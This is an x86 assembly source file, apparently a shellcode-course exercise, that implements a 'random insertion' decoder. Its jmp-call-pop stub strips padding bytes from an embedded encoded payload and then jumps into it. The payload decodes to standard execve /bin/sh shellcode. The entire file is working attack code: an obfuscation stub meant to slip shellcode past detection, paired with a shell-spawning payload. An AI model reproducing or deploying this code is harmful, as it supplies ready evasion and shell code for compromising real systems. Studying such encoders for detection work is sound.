; Filename: random-insertion-decoder2.asm
; Author: citu_adrian@yahoo.com
; Website: itblog.adrian.citu.name

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
       ;get the adress of the shellcode
       pop esi
       
       ;allign edi and esi
       lea edi, [esi]

  handle_next_block:
       ;check that the esi do not point
       ;to the terminator byte
       xor ecx,ecx
       mov cl, byte[esi]
       mov bl , cl
       xor bl, 0xff
       
       ;if esi points to terminator byte
       ;then execute the shellcode
       jz short EncodedShellcode

       ;otherwise then ship next byte
       ;because it's the first byte
       ;of the block and it contains
       ;the number of bytes that
       ;the block contains.
       inc esi
       
       ;dl it is used to count the
       ;number of bytes from a block
       ;already copied
       xor edx, edx
  handle_next_byte:
       ;check that the esi do not point
       ;to the terminator byte
       mov bl, [esi]
       xor bl, 0xff
       
       ;if esi points toterminator byte
       ;then execute the shellcode
       jz short EncodedShellcode
       
       ;otherwise copy the byte pointed by
       ;esi to the location pointed by edi;
       ;esi is automatically incremented by
       ;the lodsb and edi by stosb
       lodsb
       stosb
       
       ;one more byte of the block had been copied
       ;so increment the counter
       inc dl
       
       ;check that all the bytes of the block
       ;have been copied;
       ;cl contains the first byte of the block
       ;representing the number of bytes of the
       ;block and dl contains the number of
       ;block bytes already copied
       cmp cl, dl
       
       ;if not zero then not all the block bytes
       ;have been copied
       jnz handle_next_byte
       
       ;otherwise go to the next block
       jmp handle_next_block
call_shellcode:

	call decoder
	EncodedShellcode: db 0x06,0x31,0xc0,0x50,0x68,0x2f,0x2f,0x09,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x01,0x50,0x07,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0x01,0xcd,0x09,0x80,0xff

